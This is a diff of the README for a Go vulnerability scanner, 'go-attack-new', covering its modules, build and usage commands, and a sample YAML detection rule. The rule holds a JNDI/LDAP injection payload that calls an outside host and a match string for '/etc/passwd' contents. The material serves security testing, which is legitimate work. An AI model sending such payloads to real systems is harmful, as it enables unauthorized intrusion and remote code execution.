@@ -1,80 +1,123 @@
-# go-Attack
-## ForeWord
+# go-attack-new
 
-该项目仅用于记录最近所遇到的漏洞一个系统性武器化开发。如有建议，欢迎各位师傅提交issue！
+安全测试与漏洞扫描工具，提供高效的并发负载和多种漏洞检测能力
 
-## Code Structure
+## 功能特性
 
-由于本工具是自己想法的简单实现，并未参考一些成熟的漏扫工具，所以代码结构可能稍显简单。
+- 🚀 高性能并发负载引擎（ConLoad 模块）
+- 🔍 多维度漏洞检测（Judge 模块）
+  - 字符串特征检测
+  - HTTP头特征分析
+  - 响应时间异常检测
+- 🛠️ 参数生成器（Param 模块）
+  - 随机字符串生成
+  - 随机数字生成
+- 📚 漏洞检测规则库（POCs 模块）
+  - 包含常见漏洞检测规则（SQL注入、RCE等）
+  - 支持CNVD/CVE标准漏洞检测
+- 🌐 智能请求处理（request 模块）
+  - URL有效性校验
+  - 扫描目标管理
 
-```
-go-Attack
-	->CVEs
-		->AnyVulTemplate.go
-	->main.go
-```
+## 架构设计
 
-对某些代码段进行一些解释，便于二开及push
-
-#### main.go
-
-cveFunctionMap：用于添加字符串与指定漏洞函数的映射
-
-![image](https://github.com/user-attachments/assets/31b5a43f-f708-4cdd-98de-1f4bda943a2f)
-
-
-支持的命令行参数
-
-![image](https://github.com/user-attachments/assets/0a7cd257-8ce3-4fd0-9a62-dfd0b65a0d94)
-
-
--u参数下的多线程（-list同理）
-
-![image](https://github.com/user-attachments/assets/1badd3dc-c195-4dc1-89e2-2caf6b316dc9)
-
-
-#### AnyVulTemplate.go
-
-直接在函数中发送相关请求并进行判断即可
-
-![image](https://github.com/user-attachments/assets/e4f426b0-a62b-4f19-8433-ee0d33244eb3)
-
-
-## Useage
-
-`-show`：查看支持的漏洞编号
-
-![image](https://github.com/user-attachments/assets/072d0606-b27f-4766-9fd4-f0639f7c81d8)
-
-
-`-u`：指定要扫描的url
-
-`-list`：指定要扫描的url文件
-
-`-cve`：指定漏洞编号，只会对目标进行该种漏洞扫描
-
-`-attack`：输出攻击信息，含相应payload
-
-![image](https://github.com/user-attachments/assets/c6c37417-416a-408e-926f-07b1bea7f8cf)
-
-
-`-cookie`：指定请求时的cookie
-
-如有代理需求，请在proxyURL中修改代理ip
-
-![image](https://github.com/user-attachments/assets/591485c4-68b5-46ac-bde1-0e009cd20cc2)
-
-并在相关函数添加
-
-```
-Proxy:           http.ProxyURL(proxyURL()),
+```mermaid
+graph TD
+    Main[主控模块 main.go] --> ConLoad[并发负载引擎 ConLoad]
+    ConLoad --> Param[参数生成器 Param]
+    ConLoad --> Request[请求处理模块 request]
+    Request --> POCs[漏洞检测规则库 POCs]
+    Request --> Judge[检测判断模块 Judge]
+    Judge --> Tools[工具函数库 tools]
+    
+    style Main fill:#4CAF50,stroke:#388E3C
+    style ConLoad fill:#2196F3,stroke:#1976D2
+    style Param fill:#FFC107,stroke:#FFA000
+    style Request fill:#9C27B0,stroke:#7B1FA2
+    style POCs fill:#F44336,stroke:#D32F2F
+    style Judge fill:#3F51B5,stroke:#303F9F
+    style Tools fill:#009688,stroke:#00796B
 ```
 
-![image](https://github.com/user-attachments/assets/28a08e28-1d18-4e1e-a9c3-92dd3f227041)
+## 快速开始
 
+### 前置要求
+- Go 1.20+
+- 网络连接（用于下载依赖）
 
-由于多线程的原因，某些经由时间延时检测的漏洞函数可能会出现误报，可以采用`-cve`参数指定漏洞类型，精确判断
+### 安装步骤
+```bash
+# 克隆仓库
+git clone https://github.com/your-repo/go-attack-new.git
+cd go-attack-new
 
-![image](https://github.com/user-attachments/assets/685be149-ccbf-40b8-a7df-f46ddc90a0f2)
+# 安装依赖
+go mod download
 
+# 编译项目
+go build -o attack-tool main.go
+```
 
+### 基本使用
+```bash
+# 扫描单个目标
+./attack-tool -u http://example.com -poc CVE-2023-50164
+
+# 批量扫描目标
+./attack-tool -f url.txt -threads 50
+
+# 查看帮助信息
+./attack-tool -h
+```
+
+## 配置说明
+编辑 `test.yaml` 配置文件：
+
+```yaml
+# 请求配置
+requests:
+  - reqPath: "/api/v1/test"  # 请求路径 (必填)
+    timeout: 10              # 请求超时时间(秒) (默认: 5)
+    httpMethod: "POST"       # HTTP方法 (GET/POST/PUT/DELETE)
+    headers:                 # 自定义请求头
+      Content-Type: "application/json"
+    data: "{\"test\":\"{{randomString}}\"}" # 请求体，支持模板变量
+
+# 响应匹配规则
+match:
+  - type: "string"           # 匹配类型 (string/time/header)
+    matchStrings:            # 匹配字符串列表
+      - "root:[x*]:0:0:"
+    logic: "OR"              # 逻辑关系 (AND/OR)
+  - type: "time"
+    lesTime: 100             # 小于时间(毫秒)
+    maxTime: 500             # 大于时间(毫秒)
+
+# 漏洞信息配置
+info:
+  - name: "Apache Struts RCE"
+    CVE: "CVE-2023-50164"
+    CNVD: "CNVD-2024-15077"
+
+# 攻击载荷配置  
+attack:
+  - payload: "${jndi:ldap://${{randomString}}.example.com}" # 攻击载荷模板
+
+# 参数生成配置
+param:
+  - randomString: 12  # 生成随机字符串长度 (默认: 8)
+  - randomNumber: 6   # 生成随机数字位数 (默认: 4)
+
+# 头部匹配配置
+matchHeaders:
+  - matchOnlyHeaders: "X-Forwarded-For" # 指定匹配的Header
+    matchHeaderStrings: 
+      - "127.0.0.1"
+    logic: "AND"
+```
+
+## 贡献指南
+1. 提交Issue描述问题或建议
+2. Fork仓库并创建特性分支
+3. 提交Pull Request时关联相关Issue
+4. 遵循现有代码风格和测试规范
